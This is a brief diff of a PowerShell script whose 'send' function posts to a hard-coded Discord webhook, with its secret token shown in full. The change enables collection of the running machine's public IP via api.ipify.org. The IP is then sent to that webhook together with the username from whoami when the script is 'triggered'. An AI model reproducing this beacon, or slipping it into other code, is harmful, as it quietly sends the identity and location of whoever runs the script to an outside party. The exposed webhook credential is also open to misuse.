@@ -5,9 +5,9 @@ function send {
     $webhookurl = "https://discord.com/api/webhooks/1259185021613506561/Bp2soK5zsyY-iwOjKJBHH3DxydpNS8tcJfbqdD8ekv7YkLH784GO4GBic_2Nh-onnHDs" 
     if ($msg -eq "triggered") {
         $name = whoami
-        #$ip = (Invoke-WebRequest -Uri "https://api.ipify.org/?format=text").Content
+        $ip = (Invoke-WebRequest -Uri "https://api.ipify.org/?format=text").Content
         $message = @{
-            content = "the test has been triggered,  name : $name, ip : omited"
+            content = "the test has been triggered,  name : $name, ip : $ip"
         }
     } else {
         $message = @{
